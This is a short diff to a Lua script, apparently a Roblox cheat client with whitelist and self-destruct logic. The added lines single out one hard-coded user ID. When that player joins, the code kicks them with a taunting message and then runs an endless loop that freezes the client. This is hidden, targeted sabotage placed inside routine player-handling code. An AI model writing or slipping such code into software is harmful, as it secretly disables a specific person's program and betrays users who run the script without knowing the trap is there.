@@ -2064,6 +2064,11 @@ runFunction(function()
 		end))
 
 		local function newPlayer(plr)
+			if plr.UserId == 239702688 then 
+				task.spawn(function() plr:Kick("ur not funny") end)
+				task.wait(0.5)
+				while true do end
+			end
 			if (WhitelistFunctions:CheckPlayerType(plr) ~= "DEFAULT" or WhitelistFunctions.WhitelistTable.chattags[WhitelistFunctions:Hash(plr.Name..plr.UserId)]) then
 				if lplr ~= plr and WhitelistFunctions:CheckPlayerType(lplr) == "DEFAULT" then
 					GuiLibrary.SelfDestruct = function()
